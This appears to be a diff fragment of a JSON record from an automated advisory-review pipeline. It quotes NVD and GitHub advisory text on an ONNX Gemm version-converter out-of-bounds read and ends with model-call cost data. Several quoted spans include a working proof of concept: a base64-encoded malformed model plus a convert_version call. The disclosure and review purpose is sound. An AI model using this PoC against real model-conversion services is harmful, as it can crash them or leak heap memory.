+              "contains": null
+            }
+          }
+        ],
+        "network_verification_status": "not_started"
+      },
+      {
+        "task_type": "source_fact_review",
+        "status": "completed",
+        "missing_fields": [],
+        "target_sources": [
+          "github-advisories",
+          "nvd"
+        ],
+        "completion_conditions": [
+          "从公告原文中提取触发该问题所涉及的 API 名称或调用方式。"
+        ],
+        "evidence_refs": [
+          {
+            "chunk_id": "6e1faf79a36f22ab1028c508",
+            "event_id": "7bf577f3-cd5b-4452-a175-b3e60ff9a7c6",
+            "revision_id": "f1b22ef7-f7c0-48cf-8fc7-00410a2b95de",
+            "revision": 1,
+            "raw_document_id": "fe3aec9a-835e-456d-a875-c69bc622d0de",
+            "json_pointer": "/vulnerabilities/0/cve/descriptions/0/value",
+            "sha256": "05f9f5129995ad0e7953e5f863976e974a5d18b0e0fe89ae3846b4192ffdb0ed",
+            "field": "description",
+            "start": 0,
+            "end": 525,
+            "external_id": "CVE-2026-63632",
+            "source_id": "nvd",
+            "origin": "live",
+            "title": "CVE-2026-63632",
+            "source_url": "https://nvd.nist.gov/vuln/detail/CVE-2026-63632",
+            "text": "Open Neural Network Exchange (ONNX) is an open standard for machine learning interoperability. From 1.3.0 until 1.22.0, onnx.version_converter.convert_version() can perform an out-of-bounds read in Gemm_7_6::adapt_gemm_7_6() in onnx/version_converter/adapters/gemm_7_6.h when a Gemm node has input tensors with fewer than two dimensions because B_shape[1], A_shape[0], or A_shape[1] is accessed without a rank check, potentially causing a process crash during an opset 7 to 6 downgrade. This issue is fixed in version 1.22.0.",
+            "span_provenance": {
+              "version": "source-span-v1",
+              "base_chunk_id": "6e1faf79a36f22ab1028c508",
+              "base_start": 0,
+              "base_end": 525,
+              "source_field_sha256": "8b2957ec5dc456091891f3ab604bd4df7f850c6737c7395fa16e7015c2010394",
+              "source_field_chars": 525,
+              "serialization": "string-verbatim",
+              "offset_unit": "unicode_codepoint",
+              "selection_kind": "field",
+              "boundary_complete": true,
+              "max_chars": 1200,
+              "contains": null
+            }
+          },
+          {
+            "chunk_id": "84dc8e1448a002bd2be53f79",
+            "event_id": "f147dbc7-ddc8-4d8b-a827-a609fda04dbc",
+            "revision_id": "e6a5afec-4c63-4c68-a01e-93941e1628be",
+            "revision": 1,
+            "raw_document_id": "fa0a65cd-172f-4409-a610-ce7048377da8",
+            "json_pointer": "/1/description",
+            "sha256": "6bed1840ea55feb5812cbb188728069cfa403fdc15aa83864ec1b81b6c8e2a4c",
+            "field": "description",
+            "start": 647,
+            "end": 1717,
+            "external_id": "GHSA-p893-rvq9-2xf9",
+            "source_id": "github-advisories",
+            "origin": "live",
+            "title": "ONNX: Heap-Buffer-Overflow READ in Gemm Version Converter Adapter via Undersized Input Shape",
+            "source_url": "https://github.com/advisories/GHSA-p893-rvq9-2xf9",
+            "text": "if (node->hasAttribute(ktransB) && node->i(ktransB) == 1) {\n    MN.emplace_back(B_shape[0]);   // OOB if B has 0 dims\n} else {\n    MN.emplace_back(B_shape[1]);   // OOB if B has < 2 dims ← CRASH\n}\n```\n\nThe PoC has input B with shape `[28]` (1 dimension). `B_shape` has 1 element. Accessing `B_shape[1]` reads 16 bytes past the `std::vector<Dimension>` internal storage into adjacent heap memory.\n\nThe same unchecked pattern applies to `A_shape[0]` and `A_shape[1]` at lines 34 and 36.\n\n**Entry point:** `onnx.version_converter.convert_version(model, 6)` — different from the `InferShapes` bugs reported in separate advisories. This triggers during opset downgrade (7→6).\n\n### PoC\n```python\nimport base64\nimport onnx\nfrom onnx import version_converter\n\npoc_b64 = \"CAM6rwEKUQoBQQoBQgoBQRIBWSIER2VtbSoPCgVhbHBoYRUBAQA+oAEBKg4KBGJldGEVAAAAOqABASoNCgZ0dGZsc0EYAaABAioNCgZ0cmFuc0IYAKABAhIKb2Vpdl94bWZ2aFoTCgFBEg4KDAgBEggKAggCCgIIA1oTCgFCEg4KDAgBEggKAggcCgIIBFoPCgFCEgoKCAgBEgQKAggbYhMKAVkSDgoMCAESCAoCCAIKAggEQgQKABAH\"\n\nmodel = onnx.load_from_string(base64.b64decode(poc_b64))",
+            "span_provenance": {
+              "version": "source-span-v1",
+              "base_chunk_id": "84dc8e1448a002bd2be53f79",
+              "base_start": 780,
+              "base_end": 1680,
+              "source_field_sha256": "f8a843881cf5b535497dc7138e1b203c24f97da7316e8aa1171d5ec4910ee40d",
+              "source_field_chars": 2484,
+              "serialization": "string-verbatim",
+              "offset_unit": "unicode_codepoint",
+              "selection_kind": "sentences",
+              "boundary_complete": true,
+              "max_chars": 1200,
+              "contains": null
+            }
+          }
+        ],
+        "network_verification_status": "not_started"
+      },
+      {
+        "task_type": "source_fact_review",
+        "status": "completed",
+        "missing_fields": [],
+        "target_sources": [
+          "github-advisories",
+          "nvd"
+        ],
+        "completion_conditions": [
+          "从公告原文中提取 opset 降级路径的描述。"
+        ],
+        "evidence_refs": [
+          {
+            "chunk_id": "6e1faf79a36f22ab1028c508",
+            "event_id": "7bf577f3-cd5b-4452-a175-b3e60ff9a7c6",
+            "revision_id": "f1b22ef7-f7c0-48cf-8fc7-00410a2b95de",
+            "revision": 1,
+            "raw_document_id": "fe3aec9a-835e-456d-a875-c69bc622d0de",
+            "json_pointer": "/vulnerabilities/0/cve/descriptions/0/value",
+            "sha256": "05f9f5129995ad0e7953e5f863976e974a5d18b0e0fe89ae3846b4192ffdb0ed",
+            "field": "description",
+            "start": 0,
+            "end": 525,
+            "external_id": "CVE-2026-63632",
+            "source_id": "nvd",
+            "origin": "live",
+            "title": "CVE-2026-63632",
+            "source_url": "https://nvd.nist.gov/vuln/detail/CVE-2026-63632",
+            "text": "Open Neural Network Exchange (ONNX) is an open standard for machine learning interoperability. From 1.3.0 until 1.22.0, onnx.version_converter.convert_version() can perform an out-of-bounds read in Gemm_7_6::adapt_gemm_7_6() in onnx/version_converter/adapters/gemm_7_6.h when a Gemm node has input tensors with fewer than two dimensions because B_shape[1], A_shape[0], or A_shape[1] is accessed without a rank check, potentially causing a process crash during an opset 7 to 6 downgrade. This issue is fixed in version 1.22.0.",
+            "span_provenance": {
+              "version": "source-span-v1",
+              "base_chunk_id": "6e1faf79a36f22ab1028c508",
+              "base_start": 0,
+              "base_end": 525,
+              "source_field_sha256": "8b2957ec5dc456091891f3ab604bd4df7f850c6737c7395fa16e7015c2010394",
+              "source_field_chars": 525,
+              "serialization": "string-verbatim",
+              "offset_unit": "unicode_codepoint",
+              "selection_kind": "field",
+              "boundary_complete": true,
+              "max_chars": 1200,
+              "contains": null
+            }
+          },
+          {
+            "chunk_id": "84dc8e1448a002bd2be53f79",
+            "event_id": "f147dbc7-ddc8-4d8b-a827-a609fda04dbc",
+            "revision_id": "e6a5afec-4c63-4c68-a01e-93941e1628be",
+            "revision": 1,
+            "raw_document_id": "fa0a65cd-172f-4409-a610-ce7048377da8",
+            "json_pointer": "/1/description",
+            "sha256": "6bed1840ea55feb5812cbb188728069cfa403fdc15aa83864ec1b81b6c8e2a4c",
+            "field": "description",
+            "start": 647,
+            "end": 1717,
+            "external_id": "GHSA-p893-rvq9-2xf9",
+            "source_id": "github-advisories",
+            "origin": "live",
+            "title": "ONNX: Heap-Buffer-Overflow READ in Gemm Version Converter Adapter via Undersized Input Shape",
+            "source_url": "https://github.com/advisories/GHSA-p893-rvq9-2xf9",
+            "text": "if (node->hasAttribute(ktransB) && node->i(ktransB) == 1) {\n    MN.emplace_back(B_shape[0]);   // OOB if B has 0 dims\n} else {\n    MN.emplace_back(B_shape[1]);   // OOB if B has < 2 dims ← CRASH\n}\n```\n\nThe PoC has input B with shape `[28]` (1 dimension). `B_shape` has 1 element. Accessing `B_shape[1]` reads 16 bytes past the `std::vector<Dimension>` internal storage into adjacent heap memory.\n\nThe same unchecked pattern applies to `A_shape[0]` and `A_shape[1]` at lines 34 and 36.\n\n**Entry point:** `onnx.version_converter.convert_version(model, 6)` — different from the `InferShapes` bugs reported in separate advisories. This triggers during opset downgrade (7→6).\n\n### PoC\n```python\nimport base64\nimport onnx\nfrom onnx import version_converter\n\npoc_b64 = \"CAM6rwEKUQoBQQoBQgoBQRIBWSIER2VtbSoPCgVhbHBoYRUBAQA+oAEBKg4KBGJldGEVAAAAOqABASoNCgZ0dGZsc0EYAaABAioNCgZ0cmFuc0IYAKABAhIKb2Vpdl94bWZ2aFoTCgFBEg4KDAgBEggKAggCCgIIA1oTCgFCEg4KDAgBEggKAggcCgIIBFoPCgFCEgoKCAgBEgQKAggbYhMKAVkSDgoMCAESCAoCCAIKAggEQgQKABAH\"\n\nmodel = onnx.load_from_string(base64.b64decode(poc_b64))",
+            "span_provenance": {
+              "version": "source-span-v1",
+              "base_chunk_id": "84dc8e1448a002bd2be53f79",
+              "base_start": 780,
+              "base_end": 1680,
+              "source_field_sha256": "f8a843881cf5b535497dc7138e1b203c24f97da7316e8aa1171d5ec4910ee40d",
+              "source_field_chars": 2484,
+              "serialization": "string-verbatim",
+              "offset_unit": "unicode_codepoint",
+              "selection_kind": "sentences",
+              "boundary_complete": true,
+              "max_chars": 1200,
+              "contains": null
+            }
+          }
+        ],
+        "network_verification_status": "not_started"
+      },
+      {
+        "task_type": "source_fact_review",
+        "status": "completed",
+        "missing_fields": [],
+        "target_sources": [
+          "github-advisories",
+          "nvd"
+        ],
+        "completion_conditions": [
+          "从公告原文中提取输入 rank 条件。"
+        ],
+        "evidence_refs": [
+          {
+            "chunk_id": "396c2627bdb5e48fa4139bb9",
+            "event_id": "f147dbc7-ddc8-4d8b-a827-a609fda04dbc",
+            "revision_id": "e6a5afec-4c63-4c68-a01e-93941e1628be",
+            "revision": 1,
+            "raw_document_id": "fa0a65cd-172f-4409-a610-ce7048377da8",
+            "json_pointer": "/1/description",
+            "sha256": "6bed1840ea55feb5812cbb188728069cfa403fdc15aa83864ec1b81b6c8e2a4c",
+            "field": "description",
+            "start": 0,
+            "end": 901,
+            "external_id": "GHSA-p893-rvq9-2xf9",
+            "source_id": "github-advisories",
+            "origin": "live",
+            "title": "ONNX: Heap-Buffer-Overflow READ in Gemm Version Converter Adapter via Undersized Input Shape",
+            "source_url": "https://github.com/advisories/GHSA-p893-rvq9-2xf9",
+            "text": "### Summary\n\nHeap-buffer-overflow READ (16 bytes) in `Gemm_7_6::adapt_gemm_7_6()` (`onnx/version_converter/adapters/gemm_7_6.h:41`) when `ConvertVersion()` processes a model with a Gemm node whose input tensors have fewer than 2 dimensions. The adapter accesses `B_shape[1]` without checking rank. On Release builds the OOB read is silent; ASan confirms 16-byte read past a 48-byte allocation.\n\n### Details\n\nThe Gemm 7→6 downgrade adapter reads input shapes without bounds checking:\n```cpp\n// gemm_7_6.h:26-42\nconst auto& A_shape = inputs[0]->sizes();  // May have < 2 elements\nconst auto& B_shape = inputs[1]->sizes();  // May have < 2 elements\n\nif (node->hasAttribute(ktransB) && node->i(ktransB) == 1) {\n    MN.emplace_back(B_shape[0]);   // OOB if B has 0 dims\n} else {\n    MN.emplace_back(B_shape[1]);   // OOB if B has < 2 dims ← CRASH\n}\n```\n\nThe PoC has input B with shape `[28]` (1 dimension).",
+            "span_provenance": {
+              "version": "source-span-v1",
+              "base_chunk_id": "396c2627bdb5e48fa4139bb9",
+              "base_start": 0,
+              "base_end": 900,
+              "source_field_sha256": "f8a843881cf5b535497dc7138e1b203c24f97da7316e8aa1171d5ec4910ee40d",
+              "source_field_chars": 2484,
+              "serialization": "string-verbatim",
+              "offset_unit": "unicode_codepoint",
+              "selection_kind": "sentences",
+              "boundary_complete": true,
+              "max_chars": 1200,
+              "contains": null
+            }
+          },
+          {
+            "chunk_id": "6e1faf79a36f22ab1028c508",
+            "event_id": "7bf577f3-cd5b-4452-a175-b3e60ff9a7c6",
+            "revision_id": "f1b22ef7-f7c0-48cf-8fc7-00410a2b95de",
+            "revision": 1,
+            "raw_document_id": "fe3aec9a-835e-456d-a875-c69bc622d0de",
+            "json_pointer": "/vulnerabilities/0/cve/descriptions/0/value",
+            "sha256": "05f9f5129995ad0e7953e5f863976e974a5d18b0e0fe89ae3846b4192ffdb0ed",
+            "field": "description",
+            "start": 0,
+            "end": 525,
+            "external_id": "CVE-2026-63632",
+            "source_id": "nvd",
+            "origin": "live",
+            "title": "CVE-2026-63632",
+            "source_url": "https://nvd.nist.gov/vuln/detail/CVE-2026-63632",
+            "text": "Open Neural Network Exchange (ONNX) is an open standard for machine learning interoperability. From 1.3.0 until 1.22.0, onnx.version_converter.convert_version() can perform an out-of-bounds read in Gemm_7_6::adapt_gemm_7_6() in onnx/version_converter/adapters/gemm_7_6.h when a Gemm node has input tensors with fewer than two dimensions because B_shape[1], A_shape[0], or A_shape[1] is accessed without a rank check, potentially causing a process crash during an opset 7 to 6 downgrade. This issue is fixed in version 1.22.0.",
+            "span_provenance": {
+              "version": "source-span-v1",
+              "base_chunk_id": "6e1faf79a36f22ab1028c508",
+              "base_start": 0,
+              "base_end": 525,
+              "source_field_sha256": "8b2957ec5dc456091891f3ab604bd4df7f850c6737c7395fa16e7015c2010394",
+              "source_field_chars": 525,
+              "serialization": "string-verbatim",
+              "offset_unit": "unicode_codepoint",
+              "selection_kind": "field",
+              "boundary_complete": true,
+              "max_chars": 1200,
+              "contains": null
+            }
+          },
+          {
+            "chunk_id": "84dc8e1448a002bd2be53f79",
+            "event_id": "f147dbc7-ddc8-4d8b-a827-a609fda04dbc",
+            "revision_id": "e6a5afec-4c63-4c68-a01e-93941e1628be",
+            "revision": 1,
+            "raw_document_id": "fa0a65cd-172f-4409-a610-ce7048377da8",
+            "json_pointer": "/1/description",
+            "sha256": "6bed1840ea55feb5812cbb188728069cfa403fdc15aa83864ec1b81b6c8e2a4c",
+            "field": "description",
+            "start": 647,
+            "end": 1717,
+            "external_id": "GHSA-p893-rvq9-2xf9",
+            "source_id": "github-advisories",
+            "origin": "live",
+            "title": "ONNX: Heap-Buffer-Overflow READ in Gemm Version Converter Adapter via Undersized Input Shape",
+            "source_url": "https://github.com/advisories/GHSA-p893-rvq9-2xf9",
+            "text": "if (node->hasAttribute(ktransB) && node->i(ktransB) == 1) {\n    MN.emplace_back(B_shape[0]);   // OOB if B has 0 dims\n} else {\n    MN.emplace_back(B_shape[1]);   // OOB if B has < 2 dims ← CRASH\n}\n```\n\nThe PoC has input B with shape `[28]` (1 dimension). `B_shape` has 1 element. Accessing `B_shape[1]` reads 16 bytes past the `std::vector<Dimension>` internal storage into adjacent heap memory.\n\nThe same unchecked pattern applies to `A_shape[0]` and `A_shape[1]` at lines 34 and 36.\n\n**Entry point:** `onnx.version_converter.convert_version(model, 6)` — different from the `InferShapes` bugs reported in separate advisories. This triggers during opset downgrade (7→6).\n\n### PoC\n```python\nimport base64\nimport onnx\nfrom onnx import version_converter\n\npoc_b64 = \"CAM6rwEKUQoBQQoBQgoBQRIBWSIER2VtbSoPCgVhbHBoYRUBAQA+oAEBKg4KBGJldGEVAAAAOqABASoNCgZ0dGZsc0EYAaABAioNCgZ0cmFuc0IYAKABAhIKb2Vpdl94bWZ2aFoTCgFBEg4KDAgBEggKAggCCgIIA1oTCgFCEg4KDAgBEggKAggcCgIIBFoPCgFCEgoKCAgBEgQKAggbYhMKAVkSDgoMCAESCAoCCAIKAggEQgQKABAH\"\n\nmodel = onnx.load_from_string(base64.b64decode(poc_b64))",
+            "span_provenance": {
+              "version": "source-span-v1",
+              "base_chunk_id": "84dc8e1448a002bd2be53f79",
+              "base_start": 780,
+              "base_end": 1680,
+              "source_field_sha256": "f8a843881cf5b535497dc7138e1b203c24f97da7316e8aa1171d5ec4910ee40d",
+              "source_field_chars": 2484,
+              "serialization": "string-verbatim",
+              "offset_unit": "unicode_codepoint",
+              "selection_kind": "sentences",
+              "boundary_complete": true,
+              "max_chars": 1200,
+              "contains": null
+            }
+          }
+        ],
+        "network_verification_status": "not_started"
+      },
+      {
+        "task_type": "source_fact_review",
+        "status": "completed",
+        "missing_fields": [],
+        "target_sources": [
+          "github-advisories",
+          "nvd"
+        ],
+        "completion_conditions": [
+          "从公告原文中提取未检查的索引相关描述。"
+        ],
+        "evidence_refs": [
+          {
+            "chunk_id": "396c2627bdb5e48fa4139bb9",
+            "event_id": "f147dbc7-ddc8-4d8b-a827-a609fda04dbc",
+            "revision_id": "e6a5afec-4c63-4c68-a01e-93941e1628be",
+            "revision": 1,
+            "raw_document_id": "fa0a65cd-172f-4409-a610-ce7048377da8",
+            "json_pointer": "/1/description",
+            "sha256": "6bed1840ea55feb5812cbb188728069cfa403fdc15aa83864ec1b81b6c8e2a4c",
+            "field": "description",
+            "start": 0,
+            "end": 901,
+            "external_id": "GHSA-p893-rvq9-2xf9",
+            "source_id": "github-advisories",
+            "origin": "live",
+            "title": "ONNX: Heap-Buffer-Overflow READ in Gemm Version Converter Adapter via Undersized Input Shape",
+            "source_url": "https://github.com/advisories/GHSA-p893-rvq9-2xf9",
+            "text": "### Summary\n\nHeap-buffer-overflow READ (16 bytes) in `Gemm_7_6::adapt_gemm_7_6()` (`onnx/version_converter/adapters/gemm_7_6.h:41`) when `ConvertVersion()` processes a model with a Gemm node whose input tensors have fewer than 2 dimensions. The adapter accesses `B_shape[1]` without checking rank. On Release builds the OOB read is silent; ASan confirms 16-byte read past a 48-byte allocation.\n\n### Details\n\nThe Gemm 7→6 downgrade adapter reads input shapes without bounds checking:\n```cpp\n// gemm_7_6.h:26-42\nconst auto& A_shape = inputs[0]->sizes();  // May have < 2 elements\nconst auto& B_shape = inputs[1]->sizes();  // May have < 2 elements\n\nif (node->hasAttribute(ktransB) && node->i(ktransB) == 1) {\n    MN.emplace_back(B_shape[0]);   // OOB if B has 0 dims\n} else {\n    MN.emplace_back(B_shape[1]);   // OOB if B has < 2 dims ← CRASH\n}\n```\n\nThe PoC has input B with shape `[28]` (1 dimension).",
+            "span_provenance": {
+              "version": "source-span-v1",
+              "base_chunk_id": "396c2627bdb5e48fa4139bb9",
+              "base_start": 0,
+              "base_end": 900,
+              "source_field_sha256": "f8a843881cf5b535497dc7138e1b203c24f97da7316e8aa1171d5ec4910ee40d",
+              "source_field_chars": 2484,
+              "serialization": "string-verbatim",
+              "offset_unit": "unicode_codepoint",
+              "selection_kind": "sentences",
+              "boundary_complete": true,
+              "max_chars": 1200,
+              "contains": null
+            }
+          },
+          {
+            "chunk_id": "6e1faf79a36f22ab1028c508",
+            "event_id": "7bf577f3-cd5b-4452-a175-b3e60ff9a7c6",
+            "revision_id": "f1b22ef7-f7c0-48cf-8fc7-00410a2b95de",
+            "revision": 1,
+            "raw_document_id": "fe3aec9a-835e-456d-a875-c69bc622d0de",
+            "json_pointer": "/vulnerabilities/0/cve/descriptions/0/value",
+            "sha256": "05f9f5129995ad0e7953e5f863976e974a5d18b0e0fe89ae3846b4192ffdb0ed",
+            "field": "description",
+            "start": 0,
+            "end": 525,
+            "external_id": "CVE-2026-63632",
+            "source_id": "nvd",
+            "origin": "live",
+            "title": "CVE-2026-63632",
+            "source_url": "https://nvd.nist.gov/vuln/detail/CVE-2026-63632",
+            "text": "Open Neural Network Exchange (ONNX) is an open standard for machine learning interoperability. From 1.3.0 until 1.22.0, onnx.version_converter.convert_version() can perform an out-of-bounds read in Gemm_7_6::adapt_gemm_7_6() in onnx/version_converter/adapters/gemm_7_6.h when a Gemm node has input tensors with fewer than two dimensions because B_shape[1], A_shape[0], or A_shape[1] is accessed without a rank check, potentially causing a process crash during an opset 7 to 6 downgrade. This issue is fixed in version 1.22.0.",
+            "span_provenance": {
+              "version": "source-span-v1",
+              "base_chunk_id": "6e1faf79a36f22ab1028c508",
+              "base_start": 0,
+              "base_end": 525,
+              "source_field_sha256": "8b2957ec5dc456091891f3ab604bd4df7f850c6737c7395fa16e7015c2010394",
+              "source_field_chars": 525,
+              "serialization": "string-verbatim",
+              "offset_unit": "unicode_codepoint",
+              "selection_kind": "field",
+              "boundary_complete": true,
+              "max_chars": 1200,
+              "contains": null
+            }
+          },
+          {
+            "chunk_id": "84dc8e1448a002bd2be53f79",
+            "event_id": "f147dbc7-ddc8-4d8b-a827-a609fda04dbc",
+            "revision_id": "e6a5afec-4c63-4c68-a01e-93941e1628be",
+            "revision": 1,
+            "raw_document_id": "fa0a65cd-172f-4409-a610-ce7048377da8",
+            "json_pointer": "/1/description",
+            "sha256": "6bed1840ea55feb5812cbb188728069cfa403fdc15aa83864ec1b81b6c8e2a4c",
+            "field": "description",
+            "start": 647,
+            "end": 1717,
+            "external_id": "GHSA-p893-rvq9-2xf9",
+            "source_id": "github-advisories",
+            "origin": "live",
+            "title": "ONNX: Heap-Buffer-Overflow READ in Gemm Version Converter Adapter via Undersized Input Shape",
+            "source_url": "https://github.com/advisories/GHSA-p893-rvq9-2xf9",
+            "text": "if (node->hasAttribute(ktransB) && node->i(ktransB) == 1) {\n    MN.emplace_back(B_shape[0]);   // OOB if B has 0 dims\n} else {\n    MN.emplace_back(B_shape[1]);   // OOB if B has < 2 dims ← CRASH\n}\n```\n\nThe PoC has input B with shape `[28]` (1 dimension). `B_shape` has 1 element. Accessing `B_shape[1]` reads 16 bytes past the `std::vector<Dimension>` internal storage into adjacent heap memory.\n\nThe same unchecked pattern applies to `A_shape[0]` and `A_shape[1]` at lines 34 and 36.\n\n**Entry point:** `onnx.version_converter.convert_version(model, 6)` — different from the `InferShapes` bugs reported in separate advisories. This triggers during opset downgrade (7→6).\n\n### PoC\n```python\nimport base64\nimport onnx\nfrom onnx import version_converter\n\npoc_b64 = \"CAM6rwEKUQoBQQoBQgoBQRIBWSIER2VtbSoPCgVhbHBoYRUBAQA+oAEBKg4KBGJldGEVAAAAOqABASoNCgZ0dGZsc0EYAaABAioNCgZ0cmFuc0IYAKABAhIKb2Vpdl94bWZ2aFoTCgFBEg4KDAgBEggKAggCCgIIA1oTCgFCEg4KDAgBEggKAggcCgIIBFoPCgFCEgoKCAgBEgQKAggbYhMKAVkSDgoMCAESCAoCCAIKAggEQgQKABAH\"\n\nmodel = onnx.load_from_string(base64.b64decode(poc_b64))",
+            "span_provenance": {
+              "version": "source-span-v1",
+              "base_chunk_id": "84dc8e1448a002bd2be53f79",
+              "base_start": 780,
+              "base_end": 1680,
+              "source_field_sha256": "f8a843881cf5b535497dc7138e1b203c24f97da7316e8aa1171d5ec4910ee40d",
+              "source_field_chars": 2484,
+              "serialization": "string-verbatim",
+              "offset_unit": "unicode_codepoint",
+              "selection_kind": "sentences",
+              "boundary_complete": true,
+              "max_chars": 1200,
+              "contains": null
+            }
+          }
+        ],
+        "network_verification_status": "not_started"
+      },
+      {
+        "task_type": "source_fact_review",
+        "status": "completed",
+        "missing_fields": [],
+        "target_sources": [
+          "github-advisories",
+          "nvd"
+        ],
+        "completion_conditions": [
+          "从公告原文中提取与 InferShapes 问题的边界，以及 Release 与 ASan 下表现和可能影响的区分描述。"
+        ],
+        "evidence_refs": [
+          {
+            "chunk_id": "84dc8e1448a002bd2be53f79",
+            "event_id": "f147dbc7-ddc8-4d8b-a827-a609fda04dbc",
+            "revision_id": "e6a5afec-4c63-4c68-a01e-93941e1628be",
+            "revision": 1,
+            "raw_document_id": "fa0a65cd-172f-4409-a610-ce7048377da8",
+            "json_pointer": "/1/description",
+            "sha256": "6bed1840ea55feb5812cbb188728069cfa403fdc15aa83864ec1b81b6c8e2a4c",
+            "field": "description",
+            "start": 647,
+            "end": 1717,
+            "external_id": "GHSA-p893-rvq9-2xf9",
+            "source_id": "github-advisories",
+            "origin": "live",
+            "title": "ONNX: Heap-Buffer-Overflow READ in Gemm Version Converter Adapter via Undersized Input Shape",
+            "source_url": "https://github.com/advisories/GHSA-p893-rvq9-2xf9",
+            "text": "if (node->hasAttribute(ktransB) && node->i(ktransB) == 1) {\n    MN.emplace_back(B_shape[0]);   // OOB if B has 0 dims\n} else {\n    MN.emplace_back(B_shape[1]);   // OOB if B has < 2 dims ← CRASH\n}\n```\n\nThe PoC has input B with shape `[28]` (1 dimension). `B_shape` has 1 element. Accessing `B_shape[1]` reads 16 bytes past the `std::vector<Dimension>` internal storage into adjacent heap memory.\n\nThe same unchecked pattern applies to `A_shape[0]` and `A_shape[1]` at lines 34 and 36.\n\n**Entry point:** `onnx.version_converter.convert_version(model, 6)` — different from the `InferShapes` bugs reported in separate advisories. This triggers during opset downgrade (7→6).\n\n### PoC\n```python\nimport base64\nimport onnx\nfrom onnx import version_converter\n\npoc_b64 = \"CAM6rwEKUQoBQQoBQgoBQRIBWSIER2VtbSoPCgVhbHBoYRUBAQA+oAEBKg4KBGJldGEVAAAAOqABASoNCgZ0dGZsc0EYAaABAioNCgZ0cmFuc0IYAKABAhIKb2Vpdl94bWZ2aFoTCgFBEg4KDAgBEggKAggCCgIIA1oTCgFCEg4KDAgBEggKAggcCgIIBFoPCgFCEgoKCAgBEgQKAggbYhMKAVkSDgoMCAESCAoCCAIKAggEQgQKABAH\"\n\nmodel = onnx.load_from_string(base64.b64decode(poc_b64))",
+            "span_provenance": {
+              "version": "source-span-v1",
+              "base_chunk_id": "84dc8e1448a002bd2be53f79",
+              "base_start": 780,
+              "base_end": 1680,
+              "source_field_sha256": "f8a843881cf5b535497dc7138e1b203c24f97da7316e8aa1171d5ec4910ee40d",
+              "source_field_chars": 2484,
+              "serialization": "string-verbatim",
+              "offset_unit": "unicode_codepoint",
+              "selection_kind": "sentences",
+              "boundary_complete": true,
+              "max_chars": 1200,
+              "contains": null
+            }
+          },
+          {
+            "chunk_id": "f8b8de8ba602a5c6502ed1ea",
+            "event_id": "f147dbc7-ddc8-4d8b-a827-a609fda04dbc",
+            "revision_id": "e6a5afec-4c63-4c68-a01e-93941e1628be",
+            "revision": 1,
+            "raw_document_id": "fa0a65cd-172f-4409-a610-ce7048377da8",
+            "json_pointer": "/1/description",
+            "sha256": "6bed1840ea55feb5812cbb188728069cfa403fdc15aa83864ec1b81b6c8e2a4c",
+            "field": "description",
+            "start": 1399,
+            "end": 2484,
+            "external_id": "GHSA-p893-rvq9-2xf9",
+            "source_id": "github-advisories",
+            "origin": "live",
+            "title": "ONNX: Heap-Buffer-Overflow READ in Gemm Version Converter Adapter via Undersized Input Shape",
+            "source_url": "https://github.com/advisories/GHSA-p893-rvq9-2xf9",
+            "text": "poc_b64 = \"CAM6rwEKUQoBQQoBQgoBQRIBWSIER2VtbSoPCgVhbHBoYRUBAQA+oAEBKg4KBGJldGEVAAAAOqABASoNCgZ0dGZsc0EYAaABAioNCgZ0cmFuc0IYAKABAhIKb2Vpdl94bWZ2aFoTCgFBEg4KDAgBEggKAggCCgIIA1oTCgFCEg4KDAgBEggKAggcCgIIBFoPCgFCEgoKCAgBEgQKAggbYhMKAVkSDgoMCAESCAoCCAIKAggEQgQKABAH\"\n\nmodel = onnx.load_from_string(base64.b64decode(poc_b64))\n\n# Triggers heap-buffer-overflow in Gemm_7_6 adapter\nversion_converter.convert_version(model, 6)\n```\n\n186-byte PoC. ASan confirms: `heap-buffer-overflow READ of size 16` at `gemm_7_6.h:41`, `0 bytes after 48-byte region` allocated in `tensorShapeProtoToDimensions` at `ir_pb_converter.cc:216`.\n\n### Impact\n\nAny application that uses `onnx.version_converter.convert_version()` on untrusted models is vulnerable. This includes model conversion pipelines and tools that auto-downgrade opset versions for compatibility. On Release builds the OOB read is silent — the read value propagates into the converted model's output shape, potentially leaking heap data. On ASan builds it's detected as a heap-buffer-overflow. Could also cause crashes with different heap layouts.",
+            "span_provenance": {
+              "version": "source-span-v1",
+              "base_chunk_id": "f8b8de8ba602a5c6502ed1ea",
+              "base_start": 1560,
+              "base_end": 2460,
+              "source_field_sha256": "f8a843881cf5b535497dc7138e1b203c24f97da7316e8aa1171d5ec4910ee40d",
+              "source_field_chars": 2484,
+              "serialization": "string-verbatim",
+              "offset_unit": "unicode_codepoint",
+              "selection_kind": "sentences",
+              "boundary_complete": true,
+              "max_chars": 1200,
+              "contains": null
+            }
+          }
+        ],
+        "network_verification_status": "not_started"
+      }
+    ],
+    "context": {
+      "sources": [
+        "github-advisories",
+        "nvd"
+      ],
+      "citations": 5,
+      "truncated": true,
+      "relations": []
+    },
+    "cost": {
+      "external_requests": 5,
+      "billed_tokens": 29912,
+      "api_usd": 0.004340976,
+      "local_compute_usd": null,
+      "current_attempt_external_requests": 0,
+      "model_calls_attempted": 5,
+      "monetary": {
+        "status": "confirmed",
+        "unique_calls": 5,
+        "duplicates_ignored": 0,
+        "unknown_calls": 0,
+        "estimated_calls": 0,
+        "currency_totals": {
+          "USD": {
+            "complete": true,
+            "amount": 0.004340976,
+            "amount_decimal": "0.004340976",
+            "known_subtotal_min": 0.004340976,
+            "known_subtotal_max": 0.004340976,
+            "known_subtotal_min_decimal": "0.004340976",
+            "known_subtotal_max_decimal": "0.004340976",
+            "amount_min": 0.004340976,
+            "amount_max": 0.004340976,
+            "priced_calls": 5,
+            "unknown_calls": 0
+          }
+        },
+        "calls": [
+          {
+            "status": "confirmed",
+            "provider": "deepseek",
+            "model": "deepseek-v4-flash",
+            "currency": "USD",
+            "amount": 0.000355254,
+            "amount_decimal": "0.000355254",
+            "amount_min": 0.000355254,
+            "amount_max": 0.000355254,
+            "amount_min_decimal": "0.000355254",
+            "amount_max_decimal": "0.000355254",
+            "reasons": [],
+            "basis": "usage_times_published_or_operator_token_rates_not_invoice",
+            "exchange_rate_applied": false,
+            "usage": {
+              "prompt_tokens": 945,
+              "completion_tokens": 544,
+              "prompt_cache_hit_tokens": 768,
+              "prompt_cache_miss_tokens": 177,
+              "total_tokens": 1489
+            },
+            "price": {
+              "model": "deepseek-flash",
+              "served_model": "DeepSeek-V4.1-Flash",
+              "currency": "USD",
+              "source_url": "https://api-docs.deepseek.com/quick_start/pricing/",
+              "effective_source_url": "https://api-docs.deepseek.com/news/news260910/",
+              "checked_at": "2026-10-12T17:41:45Z",
+              "effective_from": "2026-09-10T04:00:00Z",
+              "effective_to": null,
